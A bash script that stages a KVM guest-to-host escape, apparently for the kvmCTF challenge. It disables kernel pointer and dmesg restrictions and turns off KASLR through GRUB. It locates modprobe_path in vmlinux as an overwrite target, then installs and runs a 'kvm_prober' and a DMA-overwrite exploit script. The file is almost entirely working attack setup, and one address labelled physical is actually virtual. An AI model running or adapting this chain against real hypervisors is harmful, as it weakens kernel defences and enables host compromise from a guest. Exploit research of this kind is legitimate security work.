#!/bin/bash

echo -e "\n\033[1;36m[*] Ensuring environment is ready...\033[0m"

sleep 2
# Fetch vmlinux only if not already present
if [ ! -f "/root/vmlinux" ]; then
    echo "[*] Downloading latest kvmctf bundle for vmlinux..."
    wget -q https://storage.googleapis.com/kvmctf/latest.tar.gz
    tar -xzf latest.tar.gz
    mv /root/kvmctf-6.1.74/vmlinux/vmlinux /root
    echo "[+] vmlinux moved to /root"
else
    echo "[+] /root/vmlinux already exists, skipping download."
fi

echo -e "\n\033[1;36m[*] Installing missing packages...\033[0m"
sleep 1
apt update -y >/dev/null
apt install sudo make xxd python3-pip build-essential python3-importlib-metadata binutils tar -y >/dev/null || true

sleep 2
### ===Kernel Header Installation===
echo "[*] Installing kernel headers for exploit environment"
KERN_VER=$(uname -r)
echo "[+] Detected kernel version: $KERN_VER"

sleep 2
# Check if the kernel version contains "6.1.0-21"
if [[ "$KERN_VER" == *"6.1.0-21"* ]]; then
    echo "[*] Downloading/Installing matching kvmCTF headers"
    wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-common_6.1.90-1_all.deb
    wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb
    dpkg -i ./linux-headers-6.1.0-21-common_6.1.90-1_all.deb || true
    dpkg -i ./linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb || true
    apt-get --fix-missing install -y >/dev/null
else
    # Check if /proc/kallsyms exists
    if [[ -f /proc/kallsyms ]]; then
        echo "[*] /proc/kallsyms exists, proceeding..."
        cat /proc/kallsyms | grep modprobe_path
    else
        echo "[!] /proc/kallsyms not found, exiting."
        exit 1
    fi
fi

sleep 2
### ===Verify installation===
echo "[*] Verifying $KERN_VER/build directory"
if [ -d "/lib/modules/$KERN_VER/build" ]; then
    echo "[+] Headers successfully installed at /lib/modules/$KERN_VER/build"
else
    echo "[!] Header installation failed - continuing with exploit anyway"
    echo "[!] Exploit doesn't require headers but they're nice to have for debugging"
fi

sleep 2
### ===System Configuration Checks===
echo "[*] Performing system configuration checks"

sleep 2
### ===Ensure kptr_restrict is disabled===
echo 0 |  tee /proc/sys/kernel/kptr_restrict
echo 0 |  tee /proc/sys/kernel/dmesg_restrict
echo "[+] Disabled kernel restrictions"

if grep -qw "nokaslr" /proc/cmdline; then
    echo "[+] KASLR is DISABLED (nokaslr in cmdline)"
else
    echo "[!] KASLR is ENABLED - attempting to disable for next boot..."
    # Add nokaslr to GRUB if not already present
    if ! grep -qw "nokaslr" /etc/default/grub; then
         sed -i 's/^GRUB_CMDLINE_LINUX=\"/GRUB_CMDLINE_LINUX=\"nokaslr /' /etc/default/grub
         update-grub
        echo "[+] 'nokaslr' added to GRUB. You must reboot for KASLR to be disabled."
        echo "[+] Reboot now? (y/N)"
        read answer
        if [[ "$answer" =~ ^[Yy]$ ]]; then
             reboot
        else
            echo "[!] KASLR will remain enabled until you reboot."
        fi
    else
        echo "[*] 'nokaslr' already in /etc/default/grub. Just reboot to disable KASLR."
    fi
fi

sleep 2
### ===Create kvm_prober===
echo "[*] Installing exploit script"

# Check if previous kvm_prober directory exists
if ls -la /tmp/kvm_probe_build* &>/dev/null; then
    echo "[!] Removing previous kvm_prober directory"
    rm -r /tmp/kvm_probe_build*
fi

# Install kvm_prober
echo "[*] Installing kvm prober"
python3 /root/kvm_dma_overwrite.py

sleep 2
### ===Set kvm_prober globally accessible (if not already present)===
echo -e "\n\033[1;36m[*] Setting kvm_prober into /usr/local/bin...\033[0m"
sleep 1
PROBE_DIR=$(find /tmp -type d -name "kvm_probe_build*" | head -n1)
cp "$PROBE_DIR/kvm_prober" /usr/local/bin

sleep 2
### ===Verify prober functionality===
echo "[*] Verifying kvm_prober"
if kvm_prober allocvqpage; then
    echo "[+] kvm_prober functional"
else
    echo "[!] kvm_prober test failed - check compatibility"
fi

sleep 2
### ===Check /proc/iomem and Kernel Symbol Access===
if  grep -q "Kernel code" /proc/iomem; then
    KERNEL_LINE=$( grep "Kernel code" /proc/iomem | head -n1)
    KERNEL_PHYS_BASE=$(echo "$KERNEL_LINE" | awk '{print $1}' | cut -d'-' -f1)
    echo "[+] Kernel physical base address: 0x$KERNEL_PHYS_BASE"
else
    echo "[!] /proc/iomem not accessible. Will use fallback calculation (riskier, less reliable)."
    KERNEL_PHYS_BASE=""
fi

sleep 2
echo "[*] Verifying kernel symbol visibility"
REQUIRED_SYMBOLS=("modprobe_path" "_text")
for sym in "${REQUIRED_SYMBOLS[@]}"; do
    addr=$(nm -n /root/vmlinux | grep " $sym" | awk '{print $1}')
    if [[ -n "$addr" ]]; then
        echo "[+] Symbol '$sym' found at address: 0x$addr"
    else
        echo "[!] CRITICAL: Symbol '$sym' not found! Exploit may fail - check vmlinux"
    fi
done

sleep 2
echo "[*] Verifying if vmlinux is available"

sleep 2
# Check if vmlinux exists
if [[ ! -f /root/vmlinux ]]; then
    echo "[!] vmlinux not available!"
fi

sleep 2
# Extract modprobe_path and _text addresses
MODPROBE_VA=$(nm -n /root/vmlinux | grep " modprobe_path" | awk '{print $1}')
VIRT_BASE=$(nm -n /root/vmlinux | grep " _text" | awk '{print $1}')

sleep 2
# Convert modprobe_path to physical address
MODPROBE_PA="0x$MODPROBE_VA"
echo "[+] Host modprobe_path: $MODPROBE_PA"

sleep 2
# Write to modprobe_candidates
echo "$MODPROBE_PA" > /root/modprobe_candidates

sleep 2
# Verify if modprobe_candidates was created
if [[ ! -f /root/modprobe_candidates ]]; then
    echo "[!] modprobe_candidates not created! vmlinux might be unavailable."
fi

echo "[✔] modprobe_candidates successfully created!"
echo "[*] $MODPROBE_PA"

echo "[*] getting kvm_prober all setup"
python3 kvm_dma_overwrite.py

sleep 2
echo "[*] running read and write flag tests"
bash run_mmio_prober.sh
